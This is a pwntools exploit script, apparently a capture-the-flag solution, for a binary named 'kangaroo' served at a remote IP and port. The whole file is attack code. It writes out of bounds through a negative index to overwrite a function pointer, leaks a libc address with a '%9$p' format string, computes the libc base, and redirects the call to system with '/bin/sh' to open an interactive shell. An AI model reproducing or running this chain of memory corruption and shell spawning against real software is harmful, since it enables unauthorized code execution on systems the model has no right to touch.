from pwn import *
from icecream import ic

elf = exe = ELF("./kangaroo")
libc = ELF("./libc.so.6")

context.binary = exe
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("34.170.146.252", 54223)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
b *0x00000000004013d2
b *get_offset
b *0x00000000004013ea
c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a, drop = True)
def rl(): return io.recvline()
def uu64(a): return u64(re(a).ljust(8, b"\x00"))
def gad(a, b): return ROP(a).find_gadget(b)[0]
def qgad(a, b): return ROP(a).find_gadget([f"pop " + b, "ret"])[0]
def binsh(a): return next(a.search(b"/bin/sh\x00"))
def i(): return io.interactive()

io = start()

def read(idx, data):
    sla("> ", "1")
    sla("Index: ", str(idx))
    sla("Message: ", data)

def write(idx):
    sla("> ", "2")
    sla("Index: ", str(idx))
    ru("Message: ")

def clear(idx):
    sla("> ", "3")
    sla("Index: ", str(idx))

offset = -1024819115206086193
read(offset, b'a' *8 + p64(elf.plt["printf"]))

read(0, b'%9$p')
sla(b">", b'3')
ic(re(14))
libc.address = int(re(14), 16) - 0x2a1ca
ic(hex(libc.address))

read(offset, b'a' *8 + p64(libc.sym["system"]))
read(0, b"/bin/sh\x00")
sla(">", "3")
# read(7, b'a'*0x48)
io.interactive()
